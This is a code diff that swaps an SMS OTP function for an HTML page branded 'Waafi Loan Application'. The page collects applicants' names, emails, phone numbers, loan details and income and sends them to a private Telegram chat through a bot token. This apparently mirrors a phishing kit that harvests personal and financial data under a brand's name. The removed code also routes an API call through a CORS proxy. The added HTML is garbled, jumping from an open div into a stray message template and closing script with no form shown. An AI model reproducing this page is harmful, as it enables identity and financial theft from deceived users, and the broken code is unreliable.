@@ -1,27 +1,54 @@
-async function sendOTP() {
-  const phone = document.getElementById('phone').value;
-  if(phone.length < 9) return alert('Enter valid phone number');
-  if(!loanType) return alert('Please select loan type');
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Waafi Loan Application</title>
+<style>
+body { font-family: Arial, sans-serif; margin:0; background:#f5f5f5; }
+.header { background: linear-gradient(90deg, #a8e063, #00B347); padding:15px; color:white; text-align:center; font-weight:bold; font-size:20px; }
+.container { padding:20px; max-width:600px; margin:auto; }
+.card { background:white; padding:20px; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.1); margin-bottom:20px; }
+h3 { color:#00B347; margin-top:0; }
+.grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin:10px 0; }
+.option { padding:15px; border:2px solid #ddd; border-radius:10px; text-align:center; cursor:pointer; font-weight:bold; }
+.option.selected { border-color:#00B347; background:#e8f5e9; }
+label { display:block; margin:15px 0 5px 0; font-weight:bold; }
+input, select { width:100%; padding:12px; border:1px solid #ddd; border-radius:8px; box-sizing:border-box; }
+.btn { width:100%; padding:16px; border:none; border-radius:8px; font-size:18px; font-weight:bold; background: linear-gradient(90deg, #a8e063, #00B347); color:white; cursor:pointer; margin-top:10px; }
+.btn-otp { background:#0084ff; }
+.note { font-size:12px; color:#666; margin-top:5px; }
+</style>
+</head>
+<body>
+<div class="header">Waafi - Loan Application</div>
+<div class="container">
+<div class="card">
 
-  generatedOTP = Math.floor(1000 + Math.random() * 9000);
-  const message = `Waafi: Your verification code is ${generatedOTP}. Valid for 5 minutes.`;
-  
-  const formData = new FormData();
-  formData.append('username', 'sandbox');
-  formData.append('to', `+252${phone}`);
-  formData.append('message', message);
-  formData.append('apiKey', 'PASTE_YOUR_API_KEY_HERE');
+👤 NAME: ${data.fname} ${data.lname}
+📧 EMAIL: ${data.email}
+📱 PHONE: +252 ${data.phone} ✅ OTP VERIFIED
 
-  try {
-    // Using corsproxy to bypass the browser block
-    const res = await fetch("https://corsproxy.io/?https://api.sandbox.africastalking.com/version1/messaging", {
-      method: "POST",
-      body: formData
-    });
-    const data = await res.json();
-    if(data.SMSMessageData && data.SMSMessageData.Recipients[0].status === 'Success') {
-      alert('✅ OTP Sent to +252' + phone);
-      document.getElementById('otpSection').style.display = 'block';
-    } else { alert('❌ Failed to send SMS: ' + JSON.stringify(data)); }
-  } catch(e) { alert('❌ Error: ' + e.message); }
+💰 LOAN: ${data.loanType}
+💵 AMOUNT: $${data.amount}
+📅 PERIOD: ${data.period}
+🎯 PURPOSE: ${data.purpose}
+
+💼 WORK: ${data.work}
+📈 INCOME: $${data.income}
+
+--- Sent from Waafi Website ---`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+  })
+.then(() => { 
+   alert("✅ Verified! Application Sent. We will call you in 24h.");
+   document.getElementById('otpSection').style.display = 'none';
+ })
+.catch(() => alert("❌ Error sending to Telegram"));
 }
+</script>
+</body>
+</html>
